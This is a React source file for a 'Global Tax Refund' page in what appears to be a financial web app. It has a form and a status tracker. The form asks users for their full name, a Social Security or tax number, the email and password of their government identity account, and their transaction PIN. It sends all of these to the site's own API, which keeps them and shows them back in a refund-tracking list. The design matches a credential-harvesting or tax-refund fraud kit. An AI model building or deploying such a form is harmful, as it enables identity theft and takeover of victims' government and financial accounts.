'use client';

import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import {
  FileText,
  User,
  Shield,
  Globe,
  AlertTriangle,
  Mail,
  Lock,
  ArrowRight
} from 'lucide-react';
import { useAuth } from '@/contexts/AuthContext';
import { showSuccess, showError } from '@/utils/toast';
import { usePinPrompt } from './PinPrompt';

const TrackingView = ({ onBack }: { onBack: () => void }) => {
  const [refunds, setRefunds] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const fetchRefunds = async () => {
      try {
        const response = await fetch('/api/tax-refunds');
        const result = await response.json();
        if (result.success) {
          setRefunds(result.data);
        }
      } catch (error) {
        console.error('Error fetching tax refunds:', error);
      } finally {
        setIsLoading(false);
      }
    };
    fetchRefunds();
  }, []);

  const getStatusColor = (status: string) => {
    switch (status.toLowerCase()) {
      case 'approved': return 'bg-green-50 text-green-500 border-green-100';
      case 'rejected': return 'bg-red-50 text-red-500 border-red-100';
      case 'processing': return 'bg-blue-50 text-blue-500 border-blue-100';
      default: return 'bg-primary-50 text-primary-500 border-primary-100';
    }
  };

  return (
    <div className="space-y-6 mobile:space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">

      <div className="bg-white rounded-3xl mobile:rounded-[2.5rem] p-6 mobile:p-12 border border-gray-100 shadow-sm relative overflow-hidden">
        <div className="absolute top-0 right-0 w-64 h-64 bg-navy-50 rounded-full -mr-32 -mt-32 blur-3xl"></div>

        <div className="relative z-10">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-8 mobile:mb-12">
            <div>
              <h3 className="text-2xl mobile:text-3xl font-black text-navy-900 uppercase tracking-tight mb-2">Refund status</h3>
              <p className="text-gray-500 text-xs mobile:text-sm">Monitor the forensic validation of your tax assets</p>
            </div>
            <div className="flex items-center self-start md:self-auto gap-3 px-4 py-2 bg-navy-900 rounded-2xl border border-navy-800 shadow-lg shadow-navy-900/10">
              <Lock className="w-4 h-4 text-primary-500" />
              <span className="text-[10px] font-black text-white uppercase tracking-widest">{refunds.length} Asset Sequences</span>
            </div>
          </div>

          {isLoading ? (
            <div className="py-20 flex flex-col items-center justify-center space-y-4">
              <div className="w-12 h-12 border-4 border-primary-500 border-t-transparent rounded-full animate-spin"></div>
              <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Scanning Global Ledger...</p>
            </div>
          ) : refunds.length > 0 ? (
            <div className="space-y-6">
              {refunds.map((refund) => (
                <div key={refund._id} className="group bg-gray-50 rounded-3xl p-6 mobile:p-8 border border-gray-100 hover:border-primary-500/30 transition-all">
                  <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 mobile:gap-8">
                    <div className="flex items-start gap-4 mobile:gap-6">
                      <div className="w-14 h-14 mobile:w-16 mobile:h-16 bg-white rounded-2xl mobile:rounded-[1.5rem] flex items-center justify-center shadow-sm group-hover:shadow-md transition-all border border-gray-100 shrink-0">
                        <User className="w-6 h-6 mobile:w-7 mobile:h-7 text-navy-900" />
                      </div>
                      <div className="min-w-0">
                        <div className="flex flex-wrap items-center gap-2 mobile:gap-3 mb-2">
                          <h4 className="font-black text-navy-900 uppercase tracking-tight text-base mobile:text-lg truncate max-w-[150px] mobile:max-w-none">{refund.fullName}</h4>
                          <span className={`px-3 py-1 rounded-full text-[8px] mobile:text-[9px] font-black uppercase tracking-widest border whitespace-nowrap ${getStatusColor(refund.status)}`}>
                            {refund.status}
                          </span>
                        </div>
                        <div className="flex flex-col mobile:flex-row mobile:items-center gap-2 mobile:gap-4">
                          <p className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest flex items-center gap-1.5">
                            <Shield className="w-3.5 h-3.5" /> Tax ID: XXX-XX-{refund.ssn.slice(-4)}
                          </p>
                          <p className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest flex items-center gap-1.5">
                            <Globe className="w-3.5 h-3.5" /> {refund.country}
                          </p>
                        </div>
                      </div>
                    </div>

                    <div className="flex flex-wrap gap-6 mobile:gap-10 pt-4 mobile:pt-0 border-t mobile:border-t-0 border-gray-200/50">
                      <div>
                        <p className="text-[8px] mobile:text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1.5">Government ID Profile</p>
                        <p className="text-[10px] mobile:text-[11px] font-black text-navy-900 tracking-tight lowercase">{refund.idmeEmail}</p>
                      </div>
                      <div>
                        <p className="text-[8px] mobile:text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1.5">Entry Logged</p>
                        <p className="text-[10px] mobile:text-[11px] font-black text-navy-900 tracking-tight uppercase">{new Date(refund.createdAt).toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' })}</p>
                      </div>
                    </div>
                  </div>

                  {/* Tracking Timeline - Responsive */}
                  <div className="mt-8 pt-6 mobile:mt-10 mobile:pt-10 border-t border-gray-200/50">
                    {/* Desktop Horizontal Timeline */}
                    <div className="hidden mobile:block relative">
                      <div className="absolute top-1/2 left-0 w-full h-px bg-gray-200 -translate-y-1/2"></div>
                      <div className="relative flex justify-between items-center px-4">
                        {[
                          { label: 'Transmission', active: true, done: true },
                          { label: 'Checking your claim', active: refund.status !== 'pending', done: refund.status !== 'pending' && refund.status !== 'processing' },
                          { label: 'Asset Release', active: refund.status === 'approved' || refund.status === 'rejected', done: refund.status === 'approved' || refund.status === 'rejected' }
                        ].map((step, i) => (
                          <div key={i} className="flex flex-col items-center gap-4 relative z-10">
                            <div className={`w-3 h-3 rounded-full border-2 border-white transition-all ring-1 ${step.done ? 'bg-green-500 ring-green-500 scale-150' :
                              step.active ? 'bg-primary-500 ring-primary-500 scale-125 animate-pulse' :
                                'bg-gray-200 ring-gray-200'
                              }`}></div>
                            <span className={`text-[8px] font-black uppercase tracking-widest ${step.active ? 'text-navy-900' : 'text-gray-300'
                              }`}>{step.label}</span>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Mobile Vertical Timeline */}
                    <div className="mobile:hidden space-y-4">
                      {[
                        { label: 'Secure Transmission', active: true, done: true, desc: 'Encrypted packet sent to retrieval ledger.' },
                        { label: 'Verifying your refund', active: refund.status !== 'pending', done: refund.status !== 'pending' && refund.status !== 'processing', desc: 'We are checking the refund details.' },
                        { label: 'Authorised Asset Release', active: refund.status === 'approved' || refund.status === 'rejected', done: refund.status === 'approved' || refund.status === 'rejected', desc: 'Release of confirmed tax refund sum.' }
                      ].map((step, i) => (
                        <div key={i} className="flex gap-4">
                          <div className="flex flex-col items-center shrink-0">
                            <div className={`w-3 h-3 rounded-full border-2 border-white transition-all ${step.done ? 'bg-green-500 scale-125 shadow-[0_0_8px_rgba(34,197,94,0.3)]' :
                              step.active ? 'bg-primary-500 scale-110 animate-pulse shadow-[0_0_8px_rgba(14,90,80,0.3)]' :
                                'bg-gray-300'
                              }`}></div>
                            {i < 2 && <div className={`w-0.5 h-full min-h-[20px] bg-gray-200 mt-1`}></div>}
                          </div>
                          <div className="pb-4">
                            <span className={`text-[10px] font-black uppercase tracking-widest block mb-0.5 ${step.active ? 'text-navy-900' : 'text-gray-400'
                              }`}>{step.label}</span>
                            <p className="text-[9px] font-medium text-gray-400 lowercase">{step.desc}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className="py-24 text-center">
              <div className="w-20 h-20 mobile:w-24 mobile:h-24 bg-gray-50 rounded-[2rem] mobile:rounded-[3rem] flex items-center justify-center mx-auto mb-6 mobile:mb-8 border border-gray-100 shadow-inner">
                <FileText className="w-10 h-10 text-gray-200" />
              </div>
              <h4 className="text-xl font-black text-navy-900 uppercase tracking-tight mb-3">No Active Refund Sequences</h4>
              <p className="text-gray-400 text-sm max-w-sm mx-auto mb-10 leading-relaxed">System protocols indicate no prior asset recovery requests have been logged to your encrypted profile.</p>
              <button
                onClick={onBack}
                className="px-10 py-4 bg-navy-900 text-navy-50 rounded-2xl font-black uppercase tracking-widest text-xs shadow-xl shadow-navy-900/10 hover:bg-navy-800 active:scale-95 transition-all"
              >
                Initiate First Sequence
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

const TaxRefundSection = () => {
  const { userProfile } = useAuth();
  const { promptForPin } = usePinPrompt();
  const [view, setView] = useState<'apply' | 'track'>('apply');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Form State
  const [fullName, setFullName] = useState(`${userProfile?.firstName || ''} ${userProfile?.lastName || ''}`.trim());
  const [ssn, setSsn] = useState('');
  const [idmeEmail, setIdmeEmail] = useState('');
  const [idmePassword, setIdmePassword] = useState('');
  const [country, setCountry] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!fullName || !ssn || !idmeEmail || !idmePassword) {
      showError('Please fill in all required fields.');
      return;
    }

    const pin = await promptForPin('Enter your transaction PIN to submit your tax refund request.');
    if (!pin) return;

    setIsSubmitting(true);
    try {
      const response = await fetch('/api/tax-refunds', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fullName,
          ssn,
          idmeEmail,
          idmePassword,
          country,
          currency: userProfile?.currency || 'USD',
          pin
        })
      });

      const result = await response.json();
      if (result.success) {
        showSuccess('Tax refund request submitted successfully! Our team will process your request.');
        // Reset form
        setSsn('');
        setIdmeEmail('');
        setIdmePassword('');
        setView('track'); // Redirect to tracking
      } else {
        showError(result.error || 'Failed to submit request');
      }
    } catch (error) {
      showError('An error occurred. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="px-0 py-4 mobile:px-0 mobile:py-0 max-w-4xl mx-auto space-y-6 mobile:space-y-12">
      <div className="flex justify-end">
        <button
          onClick={() => setView(view === 'apply' ? 'track' : 'apply')}
          className="px-8 py-3 bg-white border border-gray-100 text-navy-900 rounded-2xl font-black uppercase tracking-widest text-[10px] shadow-sm hover:border-primary-500/30 transition-all flex items-center gap-3 group"
        >
          {view === 'apply' ? (
            <>
              <Lock className="w-4 h-4 text-primary-500 group-hover:scale-110 transition-transform" />
              <span>Track Requests</span>
            </>
          ) : (
            <>
              <FileText className="w-4 h-4 text-primary-500 group-hover:scale-110 transition-transform" />
              <span>New Application</span>
            </>
          )}
        </button>
      </div>

      {view === 'apply' ? (
        <>
          {/* Hero Header */}
          <div className="bg-[#14130F] rounded-2xl mobile:rounded-[2.5rem] p-5 mobile:p-12 text-white relative overflow-hidden border border-primary-500/20">
            <div className="absolute top-0 right-0 w-96 h-96 bg-primary-500/10 rounded-full -mr-48 -mt-48 blur-3xl"></div>
            <div className="relative z-10">
              <div className="flex items-center gap-3 mobile:gap-4 mb-4 mobile:mb-6">
                <div className="w-12 h-12 mobile:w-16 mobile:h-16 bg-primary-500/20 rounded-xl mobile:rounded-2xl flex items-center justify-center border border-primary-500/20">
                  <FileText className="w-7 h-7 mobile:w-10 mobile:h-10 text-primary-500" />
                </div>
                <div>
                  <h2 className="text-xl mobile:text-4xl font-black uppercase tracking-tight">Global Tax Refund</h2>
                  <p className="text-primary-500/80 font-black text-[10px] mobile:text-xs uppercase tracking-widest mt-1">Request Service Center</p>
                </div>
              </div>
              <p className="text-gray-400 text-xs mobile:text-base max-w-2xl leading-relaxed">
                Please fill out the form below to submit your tax refund request. Our experts will handle the verification and processing with efficiency.
              </p>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            {/* Form Column */}
            <div className="lg:col-span-2">
              <div className="bg-white rounded-2xl mobile:rounded-[2.5rem] p-5 mobile:p-10 border border-gray-100 shadow-sm relative overflow-hidden">
                <form onSubmit={handleSubmit} className="space-y-6 mobile:space-y-8">
                  {/* Personal Information */}
                  <div className="space-y-6">
                    <h4 className="flex items-center gap-2 text-[10px] font-black text-primary-600 uppercase tracking-[0.2em]">
                      <User className="w-4 h-4" /> Personal Information
                    </h4>

                    <div className="space-y-2">
                      <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Full Name</label>
                      <div className="relative group">
                        <User className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                        <input
                          type="text"
                          value={fullName}
                          onChange={(e) => setFullName(e.target.value)}
                          placeholder="Enter your full name"
                          className="w-full pl-12 pr-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-primary-500/20 focus:border-primary-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm"
                          required
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Tax Identification Number</label>
                      <div className="relative group">
                        <Shield className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                        <input
                          type="text"
                          value={ssn}
                          onChange={(e) => setSsn(e.target.value)}
                          placeholder="XXX XXX XXX"
                          className="w-full pl-12 pr-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-primary-500/20 focus:border-primary-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm font-mono"
                          required
                        />
                      </div>
                    </div>
                  </div>

                  {/* Government ID Credentials */}
                  <div className="space-y-6">
                    <h4 className="flex items-center gap-2 text-[10px] font-black text-primary-600 uppercase tracking-[0.2em]">
                      <Lock className="w-4 h-4" /> Government ID Credentials
                    </h4>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div className="space-y-2">
                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Government ID Email</label>
                        <div className="relative group">
                          <Mail className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                          <input
                            type="email"
                            value={idmeEmail}
                            onChange={(e) => setIdmeEmail(e.target.value)}
                            placeholder="example@email.com"
                            className="w-full pl-12 pr-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-primary-500/20 focus:border-primary-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm"
                            required
                          />
                        </div>
                      </div>

                      <div className="space-y-2">
                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Government ID Password</label>
                        <div className="relative group">
                          <Lock className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-primary-500 transition-colors" />
                          <input
                            type="password"
                            value={idmePassword}
                            onChange={(e) => setIdmePassword(e.target.value)}
                            placeholder="•••••••••••••"
                            className="w-full pl-12 pr-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-primary-500/20 focus:border-primary-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm"
                            required
                          />
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Location */}
                  <div className="space-y-6">
                    <h4 className="flex items-center gap-2 text-[10px] font-black text-primary-600 uppercase tracking-[0.2em]">
                      <Globe className="w-4 h-4" /> Location Information
                    </h4>
                    <div className="space-y-4">
                      <div className="space-y-2">
                        <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Country</label>
                        <div className="relative">
                          <select
                            value={country === '' || country === 'Afghanistan' || country === 'Canada' || country === 'United Kingdom' || country === 'Australia' ? country : 'Other'}
                            onChange={(e) => {
                              const val = e.target.value;
                              setCountry(val === 'Other' ? '' : val);
                            }}
                            className="w-full px-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-primary-500/20 focus:border-primary-500 outline-none transition-all font-bold text-navy-900 appearance-none cursor-pointer mobile:text-base text-sm"
                            required
                          >
                            <option value="">Select Country</option>
                            <option value="Australia">Australia</option>
                            <option value="Afghanistan">Afghanistan</option>
                            <option value="Canada">Canada</option>
                            <option value="United Kingdom">United Kingdom</option>
                            <option value="Other">Other (Please specify)</option>
                          </select>
                          <div className="absolute right-5 top-1/2 -translate-y-1/2 pointer-events-none">
                            <Globe className="w-4 h-4 text-gray-400" />
                          </div>
                        </div>
                      </div>

                      {(country === '' || !['Australia', 'Afghanistan', 'Canada', 'United Kingdom'].includes(country)) && (
                        <motion.div
                          initial={{ opacity: 0, y: -10 }}
                          animate={{ opacity: 1, y: 0 }}
                          className="space-y-2"
                        >
                          <label className="text-[10px] font-black text-navy-900 uppercase tracking-widest ml-1">Other Country Name</label>
                          <input
                            type="text"
                            value={country}
                            onChange={(e) => setCountry(e.target.value)}
                            placeholder="Enter your country name"
                            className="w-full px-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-primary-500/20 focus:border-primary-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm"
                            required
                          />
                        </motion.div>
                      )}
                    </div>
                  </div>

                  {/* Important Notice */}
                  <div className="mobile:p-6 p-4 bg-red-50 mobile:rounded-3xl rounded-lg border border-red-100 flex items-start space-x-4">
                    <AlertTriangle className="w-6 h-6 text-red-500 shrink-0" />
                    <div>
                      <h5 className="text-[10px] font-black text-red-700 uppercase tracking-widest mb-1">Important Notice</h5>
                      <p className="text-xs text-red-600 font-medium leading-relaxed">
                        Please ensure all information provided is accurate and matches your government ID account details. Any discrepancies may result in delays or rejection of your refund request.
                      </p>
                    </div>
                  </div>

                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full px-6 mobile:px-10 py-3 mobile:py-5 bg-navy-900 text-navy-50 rounded-xl mobile:rounded-2xl font-black uppercase tracking-widest hover:bg-navy-800 transition-all shadow-xl shadow-navy-900/10 active:scale-95 disabled:opacity-50 text-xs mobile:text-base"
                  >
                    {isSubmitting ? (
                      <div className="flex items-center justify-center space-x-2">
                        <div className="w-4 h-4 border-2 border-primary-500 border-t-transparent rounded-full animate-spin"></div>
                        <span>Processing...</span>
                      </div>
                    ) : (
                      <div className="flex items-center justify-center gap-2">
                        <span>Submit Request</span>
                        <ArrowRight className="w-5 h-5" />
                      </div>
                    )}
                  </button>
                </form>
              </div>
            </div>

            {/* Sidebar Info Column */}
            <div className="space-y-6">
              <div className="bg-white mobile:rounded-[2.5rem] rounded-lg mobile:p-8 p-4 border border-gray-100 shadow-sm">
                <h4 className="text-sm font-black text-navy-900 uppercase tracking-tight mb-4">Process Timeline</h4>
                <div className="space-y-6">
                  {[
                    { title: 'Submision', time: 'Today', status: 'done' },
                    { title: 'Verification', time: '24-48h', status: 'pending' },
                    { title: 'Processing', time: '3-5 Days', status: 'pending' },
                    { title: 'Disbursement', time: '7-10 Days', status: 'pending' },
                  ].map((item, i) => (
                    <div key={i} className="flex items-center gap-4">
                      <div className={`w-3 h-3 rounded-full ${item.status === 'done' ? 'bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]' : 'bg-gray-200'}`}></div>
                      <div className="flex-1">
                        <p className="text-xs font-black text-navy-900 uppercase tracking-tight">{item.title}</p>
                        <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest">{item.time}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="bg-navy-900 mobile:rounded-[2.5rem] rounded-lg mobile:p-8 p-4 text-white relative overflow-hidden group">
                <div className="absolute top-0 right-0 w-32 h-32 bg-primary-500/10 rounded-full -mr-16 -mt-16 blur-2xl group-hover:scale-150 transition-transform duration-700"></div>
                <h4 className="text-sm font-black uppercase tracking-tight mb-4 relative z-10">Need Assistance?</h4>
                <p className="text-gray-400 text-xs leading-relaxed mb-6 relative z-10">
                  Our support team is available 24/7 to help you with your tax refund enquiries.
                </p>
                <button className="w-full py-3 bg-white/10 hover:bg-white/20 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all relative z-10">
                  Contact Support
                </button>
              </div>
            </div>
          </div>
        </>
      ) : (
        <TrackingView onBack={() => setView('apply')} />
      )}
    </div>
  );
};

export default TaxRefundSection;
